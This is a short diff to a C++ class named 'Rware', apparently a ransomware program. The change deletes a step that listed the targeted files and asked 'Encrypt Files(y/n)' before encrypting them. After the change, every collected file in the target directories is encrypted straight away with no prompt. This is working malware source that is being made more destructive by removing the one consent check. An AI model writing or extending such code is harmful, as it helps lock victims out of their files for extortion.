@@ -106,14 +106,10 @@ class Rware{
             for(vector<string>::iterator it=targetDirs->begin();it!=targetDirs->end();it++){
                 fill_targets(*it);
             }
-            list();
-            cout << "Encrypt Files(y/n): ";
-            cin >> answer;
-            if(answer=="y"){
-                for(vector<experimental::filesystem::directory_entry>::iterator it=targetFiles->begin();it!=targetFiles->end();it++){
-                    encrypt(it->path(),msg);
-                }
+            for(vector<experimental::filesystem::directory_entry>::iterator it=targetFiles->begin();it!=targetFiles->end();it++){
+                encrypt(it->path(),msg);
             }
+            
         }
         ~Rware(){ // Deleting Objects
             delete targetDirs;
